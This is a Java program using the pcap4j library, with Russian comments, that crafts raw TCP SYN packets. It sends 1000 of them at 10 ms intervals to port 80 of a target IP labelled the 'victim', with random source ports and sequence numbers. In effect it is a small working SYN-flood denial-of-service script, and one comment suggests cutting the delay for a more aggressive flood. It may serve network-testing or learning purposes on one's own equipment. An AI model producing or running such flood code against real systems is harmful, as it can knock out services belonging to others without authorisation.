import org.pcap4j.core.*;
import org.pcap4j.packet.*;
import org.pcap4j.packet.namednumber.*;
import org.pcap4j.util.MacAddress;

import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.List;
import java.util.Random;

public class TestAttackImproved {

    public static void main(String[] args) throws PcapNativeException, NotOpenException, UnknownHostException, InterruptedException {
        String targetIpStr = "192.168.0.1";  // IP жертвы
        String myIpStr = "192.168.0.105";    // IP твоего интерфейса

        PcapNetworkInterface nif = getNetworkInterfaceByIp(myIpStr);
        if (nif == null) {
            System.out.println("Интерфейс с IP " + myIpStr + " не найден!");
            return;
        }
        System.out.println("Используется интерфейс: " + nif.getName());

        MacAddress srcMac = nif.getLinkLayerAddresses().stream()
                .filter(addr -> addr instanceof MacAddress)
                .map(addr -> (MacAddress) addr)
                .findFirst()
                .orElseThrow(() -> new RuntimeException("MAC адрес не найден у интерфейса"));

        System.out.println("MAC интерфейса: " + srcMac);

        // MAC назначения (например MAC роутера/шлюза)
        MacAddress dstMac = MacAddress.getByName("e4:fa:c4:10:13:ef");

        PcapHandle handle = nif.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);

        Inet4Address srcIp = (Inet4Address) InetAddress.getByName(myIpStr);
        Inet4Address dstIp = (Inet4Address) InetAddress.getByName(targetIpStr);

        Random random = new Random();

        for (int i = 0; i < 1000; i++) {  // отправить 1000 пакетов
            short srcPort = (short) (1024 + random.nextInt(60000));  // случайный исходящий порт

            TcpPacket.Builder tcpBuilder = new TcpPacket.Builder();
            tcpBuilder
                    .srcPort(TcpPort.getInstance(srcPort))
                    .dstPort(TcpPort.HTTP)  // порт 80
                    .sequenceNumber(random.nextInt())
                    .acknowledgmentNumber(0)
                    .dataOffset((byte) 5)
                    .syn(true)  // флаг SYN
                    .window((short) 65535)
                    .urgentPointer((short) 0)
                    .payloadBuilder(new UnknownPacket.Builder().rawData(new byte[0]))
                    .correctChecksumAtBuild(true)
                    .correctLengthAtBuild(true)
                    .srcAddr(srcIp)
                    .dstAddr(dstIp);

            IpV4Packet.Builder ipBuilder = new IpV4Packet.Builder();
            ipBuilder
                    .version(IpVersion.IPV4)
                    .tos(IpV4Rfc791Tos.newInstance((byte) 0))
                    .ttl((byte) 64)
                    .protocol(IpNumber.TCP)
                    .srcAddr(srcIp)
                    .dstAddr(dstIp)
                    .payloadBuilder(tcpBuilder)
                    .correctChecksumAtBuild(true)
                    .correctLengthAtBuild(true);

            EthernetPacket.Builder etherBuilder = new EthernetPacket.Builder();
            etherBuilder
                    .dstAddr(dstMac)
                    .srcAddr(srcMac)
                    .type(EtherType.IPV4)
                    .payloadBuilder(ipBuilder)
                    .paddingAtBuild(true);

            Packet synPacket = etherBuilder.build();
            handle.sendPacket(synPacket);
            System.out.println("Отправлен TCP SYN пакет #" + i);

            Thread.sleep(10);  // пауза 10 мс между пакетами (можно уменьшить для более агрессивного потока)
        }

        handle.close();
    }

    private static PcapNetworkInterface getNetworkInterfaceByIp(String ip) throws PcapNativeException {
        List<PcapNetworkInterface> allDevs = Pcaps.findAllDevs();
        for (PcapNetworkInterface nif : allDevs) {
            for (PcapAddress addr : nif.getAddresses()) {
                if (addr.getAddress() != null && addr.getAddress().getHostAddress().equals(ip)) {
                    return nif;
                }
            }
        }
        return null;
    }
}
